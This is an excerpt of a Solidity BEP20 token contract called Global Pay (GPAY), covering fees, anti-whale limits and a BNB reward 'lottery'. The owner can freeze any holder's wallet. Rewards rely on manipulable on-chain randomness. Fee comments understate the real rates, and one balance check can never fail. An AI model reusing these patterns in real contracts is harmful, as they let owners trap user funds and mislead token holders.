...
library Utils {
    ...
    function calculateBNBReward(
        ...
        if (isLotteryWonOnClaim) {
            multiplier = random(100, 200, currentBalance);
        }
...
contract GlobalPAY is Context, IBEP20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    uint256 private _tTotal = 500000000000 * 1e9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Global Pay";
    string private _symbol = "GPAY";
    ...
    uint256 public threshHoldTopUpRate = 20; // on buying more than 20 percent 
    uint256 public winningDoubleRewardPercentage = 5;
    uint256 public _maxTxAmount = _tTotal.mul(5).div(1000); // should be 0.5% percent per transaction, will be set again at activateContract() function
    uint256 public disruptiveCoverageFee = 1 ether; // antiwhale transfer Fee
    uint256 public maxDisruptiveTx = _tTotal.div(100); // 1% max
    ...
    uint256 public _taxFee = 20; // 2% will be distributed among holder as Lepi divideneds
    uint256 private _previousTaxFee = _taxFee;

    uint256 public _liquidityFee = 40; // 4% will be added to the liquidity pool
    uint256 private _previousLiquidityFee = _liquidityFee;
    
    uint256 public _poolFee = 40; // 4% will be added to pool for BNB reward
    uint256 private _previousPoolFee = _poolFee;
    
    uint256 public _charityFee = 20;  // 2% will go to the charity address 
    uint256 private _previousCharityFee = _charityFee;
    
    uint256 public _marketFee = 20;  // 2% will go to the market address 
    uint256 private _previousMarketFee = _marketFee;
    
    uint256 public _devFee = 10;  // 1% will go to the dev address 
    uint256 private _previousDevFee = _devFee;
    
    uint256 public _burnFee = 50;  // 1% will go to the Dead address to deflate Lepi
    uint256 private _previousBurnFee = _burnFee;
    
    uint256 public rewardThreshold = 1 ether; // if reward is greater than the threshold 
    ...
    event Locked(address _user, bool _state);
    ...
    constructor (address _charityAddress, address _marketWallet, address _devWallet) public {
    ...
    function lockWallet(address _user) public onlyOwner {
        isLocked[_user] = true;
        emit Locked(_user, true);
    }
    
    function unlockWallet(address _user) public onlyOwner {
        isLocked[_user] = false;
        emit Locked(_user, false);
    }
    ...
    function totalFeePerTx(uint256 tAmount) internal view returns(uint256) {
        uint256 percentage = tAmount.mul(_taxFee.add(_liquidityFee).add(_poolFee).add(_charityFee).add(_marketFee).add(_devFee).add(_burnFee)).div(1e3);
        return percentage;
    }
    ...
    function _takeBothPoolFee(uint256 tAmount, uint256 currentRate) internal {
        uint256 tPoolFee = tAmount.mul(_liquidityFee.add(_poolFee)).div(1e3);
    ...
    function _takeCharityFee(uint256 tAmount, uint256 currentRate) internal {
        uint256 tCharityFee = tAmount.mul(_charityFee).div(1e3);
    ...
    function _transfer(
        ...
        require(!isLocked[from],"BEP20: from account locked");

        if(_isExcludedFromMaxTx[from] == false && 
            _isExcludedFromMaxTx[to] == false   // by default false
        ){
            ensureMaxTxAmount(to, amount, value);
        }
    ...
    // for 1% input 100
    function setMaxDisruptiveTxPercent(uint256 maxTxAmount) public onlyOwner {
        maxDisruptiveTx = _tTotal.mul(maxTxAmount).div(10000);
    }
    ...
    function calculateBNBReward(address ofAddress) public view returns (uint256) {
        uint256 remainingSupply = uint256(_tTotal)
    ...
    function claimBNBReward() isHuman nonReentrant public {
        ...
        require(balanceOf(msg.sender) >= 0, 'Error: must own GPAY to claim reward');
        require(!isLocked[msg.sender],"Error: account locked");

        uint256 reward = calculateBNBReward(msg.sender);
        require(reward >= 0.01 ether,"Error: reward less than limit");
        // reward threshold
    ...
    function ensureMaxTxAmount(
        ...
        if ( to == pancakePair // max limit only for selling on swap
        ) {
    ...
    function disruptiveTransfer(address recipient, uint256 amount) public payable returns (bool) {
        require(amount <= maxDisruptiveTx, "Transfer amount exceeds the maxTxAmount.");
